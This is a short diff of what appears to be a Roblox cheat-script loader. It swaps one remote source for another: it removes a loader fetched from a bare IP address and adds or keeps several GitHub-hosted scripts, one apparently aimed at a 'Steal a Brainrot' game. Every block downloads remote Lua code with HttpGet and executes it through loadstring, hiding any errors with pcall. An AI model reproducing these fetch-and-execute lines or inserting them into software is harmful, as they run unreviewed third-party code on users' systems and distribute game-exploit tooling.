@@ -1,13 +1,10 @@
 pcall(function()
-    ID="d3a2f8a7-93ec-498a-923b-0e4c3e546a60";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRoblox/Ha/refs/heads/main/W-script"))()
 end)
 
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Finder/refs/heads/main/Khng"))()
 end)
-
-task.wait(5)
 
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Stealabrainrot/refs/heads/main/Khngg"))()
